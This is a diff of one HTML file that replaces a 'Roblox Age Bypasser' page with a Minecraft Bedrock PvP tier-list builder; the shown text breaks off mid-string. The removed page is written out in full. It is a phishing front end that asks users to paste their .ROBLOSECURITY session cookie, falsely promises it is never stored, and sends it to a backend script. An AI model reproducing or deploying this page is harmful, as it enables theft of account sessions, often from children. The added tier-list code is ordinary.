@@ -3,468 +3,701 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>ROBLOX AGE BYPASSER · No Scroll Square</title>
+  <title>Minecraft PvP · Bedrock Tier List</title>
+  <!-- html2canvas for PNG export (lightweight) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
     * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
     }
 
     body {
-      background: #0b0f1c;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, Helvetica, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: #0b0e14;
+      font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+      color: #eef2fb;
+      padding: 1.5rem 1rem 2rem;
       min-height: 100vh;
-      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
-    /* 
-      PERFECT SQUARE CARD — everything visible without scrolling
-      Using fixed dimensions and carefully calculated padding/spacing
-      to ensure all content fits within the square viewport.
-    */
-    .square-card {
+    .app {
+      max-width: 1300px;
       width: 100%;
-      max-width: 500px;        /* square base size */
-      aspect-ratio: 1 / 1;     /* forces perfect 1:1 square */
-      background: #11161f;
-      border-radius: 32px;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6);
-      display: flex;
-      flex-direction: column;
-      /* No overflow scroll — we design content to fit exactly */
-      overflow: visible;
     }
 
-    /* Inner spacing optimized so total height fits inside square */
-    .card-inner {
-      padding: 1.6rem 1.8rem 1.8rem 1.8rem;
-      flex: 1;
+    /* header */
+    .header {
       display: flex;
-      flex-direction: column;
+      flex-wrap: wrap;
+      align-items: center;
       justify-content: space-between;
-      height: 100%;
+      margin-bottom: 1.8rem;
     }
 
-    /* Top section group (no extra margins) */
-    .top-content {
-      flex-shrink: 0;
-    }
-
-    /* Title */
     h1 {
-      font-size: 1.75rem;
-      font-weight: 700;
-      letter-spacing: -0.3px;
-      background: linear-gradient(135deg, #ffffff, #c0c7e0);
+      font-weight: 600;
+      font-size: 2rem;
+      letter-spacing: -0.01em;
+      background: linear-gradient(135deg, #ffffff 0%, #bdd3ff 100%);
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
-      margin-bottom: 0.6rem;
-      line-height: 1.2;
-    }
-
-    /* Description */
-    .desc {
-      color: #9aa7c9;
-      font-size: 0.85rem;
-      line-height: 1.4;
-      margin-bottom: 1.2rem;
-      font-weight: 450;
-      border-left: 3px solid #ff5e5e;
-      padding-left: 0.75rem;
-    }
-
-    /* Note with circled exclamation — compact but readable */
-    .note {
-      background: rgba(255, 94, 94, 0.08);
-      border-radius: 14px;
-      padding: 0.55rem 0.9rem;
-      margin-bottom: 1.3rem;
-      font-size: 0.75rem;
-      color: #cbd5ff;
-      border: 0.5px solid rgba(255, 94, 94, 0.2);
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-    }
-
-    .circle-exclamation {
       display: inline-flex;
       align-items: center;
-      justify-content: center;
-      background: #ff5e5e;
-      width: 22px;
-      height: 22px;
-      border-radius: 50%;
-      font-weight: 800;
-      font-size: 0.8rem;
-      color: white;
-      flex-shrink: 0;
-      box-shadow: 0 2px 5px rgba(255, 94, 94, 0.4);
+      gap: 10px;
     }
 
-    .note-text {
-      line-height: 1.35;
-      flex: 1;
+    h1 img {
+      width: 36px;
+      height: 36px;
+      image-rendering: pixelated;
     }
 
-    .note-text strong {
-      color: #ffa26b;
-      font-weight: 600;
+    .toolbar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.7rem;
     }
 
-    /* Label */
-    .label {
-      font-size: 0.65rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      font-weight: 700;
-      color: #7e89ae;
-      margin-bottom: 0.4rem;
-    }
-
-    /* Input field */
-    .input-group {
-      background: #0a0e16;
-      border-radius: 18px;
-      border: 1.5px solid #232837;
-      transition: all 0.2s;
-      margin-bottom: 1rem;
-    }
-
-    .input-group:focus-within {
-      border-color: #ff5e5e;
-      box-shadow: 0 0 0 3px rgba(255, 94, 94, 0.15);
-    }
-
-    .input-group input {
-      width: 100%;
-      background: transparent;
-      border: none;
-      padding: 0.8rem 1rem;
-      font-size: 0.8rem;
-      font-family: 'SF Mono', 'Fira Code', monospace;
-      color: #f0f3ff;
-      outline: none;
-      border-radius: 18px;
-    }
-
-    .input-group input::placeholder {
-      color: #3f4765;
-      font-family: monospace;
-      font-size: 0.7rem;
-    }
-
-    /* Button */
-    .bypass-btn {
-      width: 100%;
-      background: #e6492d;
-      border: none;
-      padding: 0.75rem 0;
+    .btn {
+      background: #1e2430;
+      border: 1px solid #333b4b;
+      color: #e3e9ff;
+      padding: 0.6rem 1.2rem;
       border-radius: 40px;
-      font-weight: 700;
+      font-weight: 500;
       font-size: 0.9rem;
-      font-family: inherit;
-      color: white;
       cursor: pointer;
-      transition: 0.2s;
+      backdrop-filter: blur(4px);
+      transition: all 0.15s ease;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .btn:hover {
+      background: #2d3548;
+      border-color: #5f7bbf;
+      transform: translateY(-1px);
+      box-shadow: 0 10px 18px -6px #00000080;
+    }
+
+    .btn.primary {
+      background: #3a4c7c;
+      border-color: #7a9cf5;
+    }
+
+    /* search bar */
+    .search-section {
+      margin-bottom: 1.5rem;
       display: flex;
       align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .search-wrapper {
+      background: #151b26;
+      border-radius: 48px;
+      padding: 0.2rem 0.2rem 0.2rem 1.2rem;
+      border: 1px solid #30384a;
+      display: flex;
+      align-items: center;
+      flex: 1 1 260px;
+    }
+
+    .search-wrapper i {
+      opacity: 0.7;
+    }
+
+    #searchInput {
+      background: transparent;
+      border: none;
+      padding: 0.7rem 0.5rem 0.7rem 0.8rem;
+      font-size: 1rem;
+      color: #f0f4ff;
+      width: 100%;
+      outline: none;
+    }
+
+    #searchInput::placeholder {
+      color: #8e9bb5;
+    }
+
+    /* tier rows */
+    .tiers-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 30px;
+    }
+
+    .tier-row {
+      display: flex;
+      align-items: stretch;
+      min-height: 100px;
+      background: #121724;
+      border-radius: 22px;
+      box-shadow: 0 10px 20px -5px rgba(0,0,0,0.7);
+      border: 1px solid #29303e;
+      overflow: hidden;
+      transition: box-shadow 0.2s;
+    }
+
+    .tier-row.drag-over {
+      box-shadow: 0 0 0 3px #9bb9ff, 0 10px 20px -5px #000;
+      border-color: #6d94f0;
+    }
+
+    .tier-label {
+      width: 95px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       justify-content: center;
-      gap: 8px;
-      box-shadow: 0 5px 12px rgba(230, 73, 45, 0.3);
-      margin-bottom: 1rem;
+      font-weight: 800;
+      font-size: 2.2rem;
+      text-shadow: 0 4px 8px #00000050;
+      background: rgba(20, 30, 45, 0.7);
+      backdrop-filter: blur(4px);
+      letter-spacing: 2px;
+      border-right: 2px solid #2f3b50;
     }
 
-    .bypass-btn:hover {
-      background: #d13c21;
-      transform: scale(0.98);
+    .tier-players {
+      flex: 1;
+      padding: 12px 16px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 14px;
+      min-height: 100px;
+      transition: background 0.2s;
     }
 
-    /* Result panel — dynamic but does not cause overflow */
-    .result {
-      background: #0b0f16;
+    /* player cards */
+    .player-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 80px;
+      cursor: grab;
+      user-select: none;
+      -webkit-user-drag: element;
+      transition: transform 0.1s, filter 0.15s;
+      filter: drop-shadow(0 8px 10px #00000055);
+    }
+
+    .player-card.dragging {
+      opacity: 0.5;
+      transform: scale(0.95);
+      cursor: grabbing;
+    }
+
+    .player-card:hover {
+      transform: translateY(-3px);
+      filter: drop-shadow(0 12px 14px #00000080);
+    }
+
+    .avatar-wrapper {
+      background: #1e2636;
+      border-radius: 24px;
+      padding: 6px 6px 4px 6px;
+      box-shadow: inset 0 2px 3px #ffffff0d, 0 6px 8px #00000040;
+      border: 1px solid #3c465e;
+    }
+
+    .avatar {
+      width: 64px;
+      height: 64px;
+      image-rendering: crisp-edges; /* pixelated minecraft feel */
       border-radius: 16px;
-      padding: 0.65rem 1rem;
-      font-size: 0.78rem;
-      border-left: 4px solid #ff5e5e;
-      color: #d3defa;
-      word-break: break-word;
-      margin-bottom: 0.6rem;
+      background: #232b3b;
+      display: block;
     }
 
-    .result.hidden {
-      display: none;
-    }
-
-    .result.success {
-      border-left-color: #3eaf7c;
-      background: rgba(62, 175, 124, 0.08);
-      color: #c8f0de;
-    }
-
-    .result.error {
-      border-left-color: #ff5e5e;
-      background: rgba(255, 94, 94, 0.08);
-      color: #ffc9c9;
-    }
-
-    .result.loading {
-      border-left-color: #f0a23b;
-      background: rgba(240, 162, 59, 0.08);
-      color: #ffe2b5;
-    }
-
-    /* Footer — stays at bottom without extra scroll */
-    .footer {
+    .player-name-tooltip {
+      max-width: 90px;
+      margin-top: 6px;
+      background: #1b212e;
+      padding: 4px 10px;
+      border-radius: 30px;
+      font-size: 0.75rem;
+      font-weight: 500;
+      color: #ccdbff;
       text-align: center;
-      padding-top: 0.4rem;
-      margin-top: 0;
-      font-size: 0.65rem;
-      color: #5a6588;
-      border-top: 1px solid rgba(255, 255, 255, 0.04);
-      flex-shrink: 0;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      box-shadow: inset 0 1px 2px #3a4560;
+      border: 1px solid #3b455e;
+      width: fit-content;
+      max-width: 100%;
     }
 
-    .footer span {
-      font-family: monospace;
+    /* player pool */
+    .pool-section {
+      margin-top: 20px;
+      background: #0f1621;
+      border-radius: 30px;
+      padding: 1.2rem 1.5rem;
+      border: 1px solid #2c3548;
+      box-shadow: inset 0 2px 5px #00000050, 0 8px 18px #0000004d;
     }
 
-    .spinner {
-      display: inline-block;
-      width: 12px;
-      height: 12px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 0.6s linear infinite;
+    .pool-header {
+      display: flex;
+      align-items: baseline;
+      gap: 16px;
+      margin-bottom: 16px;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    .pool-header h2 {
+      font-weight: 500;
+      font-size: 1.5rem;
+      color: #b7c9ff;
     }
 
-    /* For very small screens, reduce inner padding slightly but maintain no-scroll */
-    @media (max-width: 520px) {
-      .card-inner {
-        padding: 1.2rem 1.4rem 1.4rem 1.4rem;
-      }
-      h1 {
-        font-size: 1.55rem;
-      }
-      .desc {
-        font-size: 0.8rem;
-        margin-bottom: 1rem;
-      }
-      .note {
-        padding: 0.5rem 0.8rem;
-        margin-bottom: 1.1rem;
-      }
-      .input-group input {
-        padding: 0.7rem 0.9rem;
-      }
-      .bypass-btn {
-        padding: 0.7rem 0;
-        margin-bottom: 0.8rem;
-      }
-      .footer {
-        font-size: 0.6rem;
-      }
+    .player-pool {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      min-height: 120px;
     }
 
-    /* Extra small devices: maintain square shape and visibility */
-    @media (max-width: 450px) {
-      .card-inner {
-        padding: 1rem 1.2rem 1.2rem 1.2rem;
+    /* tier colors */
+    .tier-s .tier-label { background: #c42e2e; }
+    .tier-a .tier-label { background: #e07c1f; }
+    .tier-b .tier-label { background: #e0b01f; }
+    .tier-c .tier-label { background: #2e9e4b; }
+    .tier-d .tier-label { background: #2e6b9e; }
+    /* custom tiers will use a default blue-grey */
+    .tier-custom .tier-label { background: #3a5470; }
+
+    .empty-message {
+      color: #7e8aa2;
+      font-style: italic;
+      padding: 0.5rem;
+    }
+
+    /* add tier row */
+    .add-tier-row {
+      display: flex;
+      justify-content: flex-end;
+      margin: 12px 0 8px;
+    }
+
+    .footer-note {
+      margin-top: 30px;
+      color: #6a7a9c;
+      text-align: center;
+      font-size: 0.85rem;
+    }
+
+    /* mobile adjustments */
+    @media (max-width: 650px) {
+      .tier-label {
+        width: 70px;
+        font-size: 1.8rem;
       }
-      .note-text {
-        font-size: 0.7rem;
+      .player-card {
+        width: 70px;
       }
-      .circle-exclamation {
-        width: 20px;
-        height: 20px;
-        font-size: 0.7rem;
+      .avatar {
+        width: 52px;
+        height: 52px;
+      }
+      .header {
+        flex-direction: column;
+        align-items: start;
+        gap: 15px;
       }
     }
   </style>
 </head>
 <body>
-<div class="square-card">
-  <div class="card-inner">
-    <!-- all content grouped to fit perfectly without scroll -->
-    <div class="top-content">
-      <h1>ROBLOX AGE BYPASSER</h1>
-      <div class="desc">
-        Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
-      </div>
-
-      <!-- Note with circled exclamation -->
-      <div class="note">
-        <div class="circle-exclamation">!</div>
-        <div class="note-text">Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
-      </div>
-
-      <div class="label">.ROBLOSECURITY COOKIE</div>
-      <div class="input-group">
-        <input type="text" id="cookieInput" placeholder="_|WARNING: DO NOT SHARE THIS|_ paste cookie here" autocomplete="off" spellcheck="false">
-      </div>
-
-      <button class="bypass-btn" id="startBtn">
-        <span>🔓</span> Start Bypass
-      </button>
+<div class="app">
+  <div class="header">
+    <h1>
+      <img src="https://mc-heads.net/avatar/MHF_Steve" alt="steve" style="width:36px; height:36px; border-radius:8px;">
+      Bedrock PvP · Tier Builder
+    </h1>
+    <div class="toolbar">
+      <button class="btn" id="resetBtn" title="Return all players to pool">⟲ Reset</button>
+      <button class="btn primary" id="exportBtn">⬇ PNG</button>
+      <button class="btn" id="addTierBtn">➕ Add Tier</button>
     </div>
+  </div>
 
-    <!-- result panel always visible area, dynamic but won't cause overflow -->
-    <div id="resultBox" class="result hidden"></div>
-
-    <!-- footer anchored at bottom -->
-    <div class="footer">
-      <span>🔒 Processed securely on our servers. No cookies are saved.</span>
+  <!-- Search -->
+  <div class="search-section">
+    <div class="search-wrapper">
+      <span>🔍</span>
+      <input type="text" id="searchInput" placeholder="Search players..." autocomplete="off">
     </div>
+    <span id="searchCount" style="font-size:0.9rem; opacity:0.8;"></span>
+  </div>
+
+  <!-- Tier rows container (S, A, B, C, D + dynamic) -->
+  <div id="tiersContainer" class="tiers-container"></div>
+
+  <!-- Add tier button alternative (inline) -->
+  <div class="add-tier-row">
+    <button class="btn" id="addTierInlineBtn" style="background:#202838;">➕ New custom tier</button>
+  </div>
+
+  <!-- Player pool -->
+  <div class="pool-section" id="poolSection">
+    <div class="pool-header">
+      <h2>⚔️ Player Pool</h2>
+      <span id="poolCount"></span>
+    </div>
+    <div id="playerPool" class="player-pool"></div>
+  </div>
+  <div class="footer-note">
+    Drag players between tiers · Hover for names · S=Red A=Orange B=Yellow C=Green D=Blue
   </div>
 </div>
 
 <script>
-  // ----------------------------------------------
-  // NO-SCROLL SQUARE CARD — everything fits inside
-  // Backend integration ready (index.php)
-  // ----------------------------------------------
+  (function(){
+    "use strict";
 
-  const cookieInput = document.getElementById('cookieInput');
-  const startBtn = document.getElementById('startBtn');
-  const resultBox = document.getElementById('resultBox');
-
-  function setResult(message, type = 'info') {
-    resultBox.classList.remove('hidden', 'success', 'error', 'loading');
-    if (type === 'success') {
-      resultBox.classList.add('success');
-    } else if (type === 'error') {
-      resultBox.classList.add('error');
-    } else if (type === 'loading') {
-      resultBox.classList.add('loading');
-    }
-    resultBox.innerHTML = message;
-  }
-
-  function isValidCookie(value) {
-    if (!value || typeof value !== 'string') return false;
-    const trimmed = value.trim();
-    return trimmed.length >= 10;
-  }
-
-  async function sendToBackend(cookie) {
-    const backendEndpoint = './index.php';
-    const formData = new URLSearchParams();
-    formData.append('roblosecurity_cookie', cookie);
-    formData.append('action', 'bypass_age');
+    // ---------- GLOBAL STATE ----------
+    let allPlayers = [];               // raw from players.json
+    let playerMap = new Map();         // name -> player object (with skin)
+    let tierData = {
+      'S': [],
+      'A': [],
+      'B': [],
+      'C': [],
+      'D': []
+    };
+    // dynamic custom tiers (store names)
+    let customTiers = [];              // e.g. ['S+', 'F']
     
-    try {
-      const response = await fetch(backendEndpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'X-Requested-With': 'XMLHttpRequest'
-        },
-        body: formData.toString(),
-        credentials: 'same-origin'
-      });
+    // Drag state
+    let dragState = {
+      active: false,
+      playerName: null,
+      sourceTierId: null,        // tier id (S/A/... or 'POOL')
+      element: null,
+      currentDropTarget: null,
+    };
+
+    // DOM elements
+    const tiersContainer = document.getElementById('tiersContainer');
+    const playerPoolDiv = document.getElementById('playerPool');
+    const searchInput = document.getElementById('searchInput');
+    const searchCountSpan = document.getElementById('searchCount');
+    const poolCountSpan = document.getElementById('poolCount');
+    const resetBtn = document.getElementById('resetBtn');
+    const exportBtn = document.getElementById('exportBtn');
+    const addTierBtn = document.getElementById('addTierBtn');
+    const addTierInlineBtn = document.getElementById('addTierInlineBtn');
+
+    // Tier label colors map
+    const tierColorMap = { 'S':'tier-s', 'A':'tier-a', 'B':'tier-b', 'C':'tier-c', 'D':'tier-d' };
+
+    // ---------- UTILS ----------
+    function getTierClass(tierId) {
+      return tierColorMap[tierId] || 'tier-custom';
+    }
+
+    // get all tier ids (including custom)
+    function getAllTierIds() {
+      return ['S','A','B','C','D', ...customTiers];
+    }
+
+    // find which tier contains a player (or null)
+    function findPlayerTier(playerName) {
+      for (let tier of getAllTierIds()) {
+        if (tierData[tier] && tierData[tier].includes(playerName)) return tier;
+      }
+      return null; // in pool
+    }
+
+    // Move player to target tier (or pool if tierId === 'POOL')
+    function movePlayerTo(playerName, targetTierId) {
+      const currentTier = findPlayerTier(playerName);
+      if (currentTier === targetTierId) return false; // same place
       
-      let responseData;
-      const contentType = response.headers.get('content-type');
-      if (contentType && contentType.includes('application/json')) {
-        responseData = await response.json();
-      } else {
-        const textResp = await response.text();
-        try {
-          responseData = JSON.parse(textResp);
-        } catch (e) {
-          responseData = { success: response.ok, message: textResp || (response.ok ? 'Bypass completed' : 'Server error') };
+      // remove from current
+      if (currentTier) {
+        tierData[currentTier] = tierData[currentTier].filter(n => n !== playerName);
+      }
+      
+      // add to target if not POOL
+      if (targetTierId !== 'POOL') {
+        if (!tierData[targetTierId]) tierData[targetTierId] = [];
+        // avoid duplicates
+        if (!tierData[targetTierId].includes(playerName)) {
+          tierData[targetTierId].push(playerName);
         }
       }
-      
-      if (!response.ok) {
-        throw new Error(responseData.message || `Request failed (${response.status})`);
-      }
-      
-      return { success: true, message: responseData.message || 'Age bypass successful', details: responseData };
-    } catch (err) {
-      console.error('[Bypasser] fetch error:', err);
-      let errorMsg = err.message;
-      if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
-        errorMsg = 'Backend not reachable. Make sure index.php is implemented and handles POST requests.';
-      }
-      return { success: false, message: errorMsg };
+      return true;
     }
-  }
 
-  async function handleBypass() {
-    let rawCookie = cookieInput.value;
-    if (!rawCookie) {
-      setResult('❌ Please paste your .ROBLOSECURITY cookie.', 'error');
-      return;
+    // Build player card DOM
+    function createPlayerCard(playerName, skinUrl) {
+      const card = document.createElement('div');
+      card.className = 'player-card';
+      card.setAttribute('draggable', 'true');
+      card.setAttribute('data-player', playerName);
+      
+      const avatarWrapper = document.createElement('div');
+      avatarWrapper.className = 'avatar-wrapper';
+      const img = document.createElement('img');
+      img.className = 'avatar';
+      img.src = skinUrl || `https://mc-heads.net/avatar/${playerName}`;
+      img.alt = playerName;
+      img.draggable = false;
+      avatarWrapper.appendChild(img);
+      
+      const tooltip = document.createElement('div');
+      tooltip.className = 'player-name-tooltip';
+      tooltip.textContent = playerName;
+      
+      card.appendChild(avatarWrapper);
+      card.appendChild(tooltip);
+      
+      // Drag event listeners
+      card.addEventListener('dragstart', handleDragStart);
+      card.addEventListener('dragend', handleDragEnd);
+      card.addEventListener('drag', (e) => { /* nothing needed */ });
+      
+      return card;
     }
-    
-    const trimmedCookie = rawCookie.trim();
-    if (!isValidCookie(trimmedCookie)) {
-      setResult('⚠️ Invalid cookie format. Ensure you provide a valid .ROBLOSECURITY token (minimum 10 characters).', 'error');
-      return;
+
+    // Render everything: tiers + pool + search filter
+    function renderAll() {
+      renderTiers();
+      renderPool();
+      updateCounts();
     }
-    
-    setResult('<div style="display:flex; align-items:center; gap:8px;"><div class="spinner"></div> Verifying and bypassing age restriction...</div>', 'loading');
-    startBtn.disabled = true;
-    startBtn.style.opacity = '0.6';
-    startBtn.style.cursor = 'wait';
-    
-    try {
-      const result = await sendToBackend(trimmedCookie);
-      if (result.success) {
-        let successText = `✅ Bypass successful!<br>${escapeHtml(result.message)}`;
-        if (result.details && result.details.details) {
-          successText += `<br><span style="font-size:0.7rem;">🔓 ${escapeHtml(result.details.details)}</span>`;
+
+    function renderTiers() {
+      const tierIds = getAllTierIds();
+      let html = '';
+      for (let tier of tierIds) {
+        const players = tierData[tier] || [];
+        const tierClass = getTierClass(tier);
+        html += `<div class="tier-row ${tierClass}" data-tier-id="${tier}">
+          <div class="tier-label">${tier}</div>
+          <div class="tier-players" data-tier="${tier}">`;
+        
+        if (players.length === 0) {
+          html += `<span class="empty-message">Drop here</span>`;
         } else {
-          successText += `<br><span style="font-size:0.7rem;">Age verification bypassed — account now unrestricted.</span>`;
+          players.forEach(pName => {
+            const player = playerMap.get(pName);
+            const skin = player ? player.skin : `https://mc-heads.net/avatar/${pName}`;
+            // we cannot use createPlayerCard easily in string, so we'll rebuild via DOM later.
+            // but for simplicity we re-create DOM after innerHTML? we'll do replace with dom.
+          });
         }
-        setResult(successText, 'success');
-      } else {
-        let errorDisplay = `❌ Bypass failed: ${escapeHtml(result.message)}`;
-        if (result.message.includes('Backend not reachable') || result.message.includes('index.php')) {
-          errorDisplay += `<br><span style="font-size:0.7rem;">🛠️ Your friend needs to implement the backend in index.php (POST parameter 'roblosecurity_cookie').</span>`;
-        }
-        setResult(errorDisplay, 'error');
+        html += `</div></div>`;
       }
-    } catch (err) {
-      setResult(`🔥 Unexpected error: ${escapeHtml(err.message)}`, 'error');
-    } finally {
-      startBtn.disabled = false;
-      startBtn.style.opacity = '1';
-      startBtn.style.cursor = 'pointer';
+      tiersContainer.innerHTML = html;
+      
+      // Now populate tier player divs with actual cards
+      for (let tier of tierIds) {
+        const tierPlayersDiv = document.querySelector(`.tier-players[data-tier="${tier}"]`);
+        if (!tierPlayersDiv) continue;
+        tierPlayersDiv.innerHTML = '';
+        const players = tierData[tier] || [];
+        if (players.length === 0) {
+          tierPlayersDiv.innerHTML = `<span class="empty-message">Drop here</span>`;
+        } else {
+          players.forEach(pName => {
+            const player = playerMap.get(pName);
+            const skin = player ? player.skin : `https://mc-heads.net/avatar/${pName}`;
+            tierPlayersDiv.appendChild(createPlayerCard(pName, skin));
+          });
+        }
+      }
+      
+      // Attach drop listeners to tier rows
+      document.querySelectorAll('.tier-row').forEach(row => {
+        row.addEventListener('dragover', handleDragOver);
+        row.addEventListener('dragleave', handleDragLeave);
+        row.addEventListener('drop', handleDrop);
+      });
     }
-  }
-  
-  function escapeHtml(str) {
-    if (!str) return '';
-    return str.replace(/[&<>]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      return m;
-    });
-  }
-  
-  startBtn.addEventListener('click', handleBypass);
-  cookieInput.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') {
+
+    function renderPool() {
+      const poolPlayers = allPlayers.filter(p => !findPlayerTier(p.name));
+      const searchTerm = searchInput.value.trim().toLowerCase();
+      const filtered = poolPlayers.filter(p => p.name.toLowerCase().includes(searchTerm));
+      
+      playerPoolDiv.innerHTML = '';
+      if (filtered.length === 0) {
+        playerPoolDiv.innerHTML = '<div class="empty-message">✨ Pool empty or no matches</div>';
+      } else {
+        filtered.forEach(p => {
+          playerPoolDiv.appendChild(createPlayerCard(p.name, p.skin));
+        });
+      }
+      
+      // Pool drop zone
+      const poolSection = document.getElementById('poolSection');
+      poolSection.addEventListener('dragover', handleDragOver);
+      poolSection.addEventListener('dragleave', handleDragLeave);
+      poolSection.addEventListener('drop', handleDrop);
+      
+      updateCounts();
+    }
+
+    function updateCounts() {
+      const poolCount = allPlayers.filter(p => !findPlayerTier(p.name)).length;
+      poolCountSpan.textContent = `(${poolCount} players)`;
+      const filteredVisible = playerPoolDiv.querySelectorAll('.player-card').length;
+      searchCountSpan.textContent = searchInput.value ? `Showing ${filteredVisible}` : '';
+    }
+
+    // Drag and Drop Handlers
+    function handleDragStart(e) {
+      const card = e.target.closest('.player-card');
+      if (!card) return;
+      const playerName = card.getAttribute('data-player');
+      
+      const sourceTier = findPlayerTier(playerName) || 'POOL';
+      
+      dragState.active = true;
+      dragState.playerName = playerName;
+      dragState.sourceTierId = sourceTier;
+      dragState.element = card;
+      
+      e.dataTransfer.setData('text/plain', playerName);
+      e.dataTransfer.effectAllowed = 'move';
+      
+      card.classList.add('dragging');
+      
+      // Optional: set drag image
+    }
+
+    function handleDragOver(e) {
       e.preventDefault();
-      handleBypass();
+      e.dataTransfer.dropEffect = 'move';
+      
+      // highlight tier row
+      const tierRow = e.target.closest('.tier-row');
+      const poolSection = e.target.closest('#poolSection');
+      
+      // remove previous highlight
+      if (dragState.currentDropTarget) {
+        dragState.currentDropTarget.classList.remove('drag-over');
+      }
+      
+      if (tierRow) {
+        tierRow.classList.add('drag-over');
+        dragState.currentDropTarget = tierRow;
+      } else if (poolSection) {
+        poolSection.classList.add('drag-over');
+        dragState.currentDropTarget = poolSection;
+      } else {
+        dragState.currentDropTarget = null;
+      }
     }
-  });
-  
-  console.log('[Roblox Bypasser] Square card (no-scroll) ready — backend integration pending in index.php');
-</script>
-</body>
-</html>
+
+    function handleDragLeave(e) {
+      const target = e.target.closest('.tier-row, #poolSection');
+      if (target && dragState.currentDropTarget === target) {
+        target.classList.remove('drag-over');
+        dragState.currentDropTarget = null;
+      }
+    }
+
+    function handleDrop(e) {
+      e.preventDefault();
+      const playerName = dragState.playerName;
+      if (!playerName) return;
+      
+      // determine target
+      const tierRow = e.target.closest('.tier-row');
+      const poolSection = e.target.closest('#poolSection');
+      let targetTier = null;
+      
+      if (tierRow) {
+        targetTier = tierRow.getAttribute('data-tier-id');
+      } else if (poolSection) {
+        targetTier = 'POOL';
+      }
+      
+      if (targetTier === null) {
+        cleanDrag();
+        return;
+      }
+      
+      // Move logic
+      const currentTier = findPlayerTier(playerName);
+      if (currentTier === targetTier) {
+        // same tier: reorder? we can allow reorder but here we just ignore.
+        cleanDrag();
+        renderAll();
+        return;
+      }
+      
+      movePlayerTo(playerName, targetTier);
+      
+      cleanDrag();
+      renderAll();
+    }
+
+    function handleDragEnd(e) {
+      cleanDrag();
+      // remove drag-over classes
+      document.querySelectorAll('.drag-over').forEach(el => el.classList.remove('drag-over'));
+      renderAll(); // ensure consistency
+    }
+
+    function cleanDrag() {
+      if (dragState.element) dragState.element.classList.remove('dragging');
+      dragState.active = false;
+      dragState.playerName = null;
+      dragState.sourceTierId = null;
+      dragState.element = null;
+      if (dragState.currentDropTarget) {
+        dragState.currentDropTarget.classList.remove('drag-over');
+        dragState.currentDropTarget = null;
+      }
+    }
+
+    // Reset: all players to pool
+    function resetTiers() {
+      ['S','A','B','C','D', ...customTiers].forEach(t => { if(tierData[t]) tierData[t] = []; });
+      renderAll();
+    }
+
+    // Export PNG
+    async function exportAsPNG() {
+      const element = document.querySelector('.app');
+      try {
+        const canvas = await html2canvas(element, {
+          backgroundColor: '#0b0e14',
+          scale: 1.5,
+          allowTaint: false,
+          useCORS: true,
+        });
+        const link = document.createElement('a');
+        link.download = 'bedrock-tierlist.png';
+        link.href = canvas.toDataURL('image/png');
+        link.click();
+      } catch (err) {
+        alert('Export failed, but you can screenshot!');
+      }
+    }
+
+    // Add custom tier
+    function addCustomTier() {
+      let newTierName = prompt('Enter tier label (e.g., S+, F, ?):');
+      if (!newTierName) return;
+      newTierName = newTierName.trim().toUpperCase();
+      if (newTierName === '') return;
+      if (getAllTierIds().includes(newTierName)) {
+        alert('Tier already exists
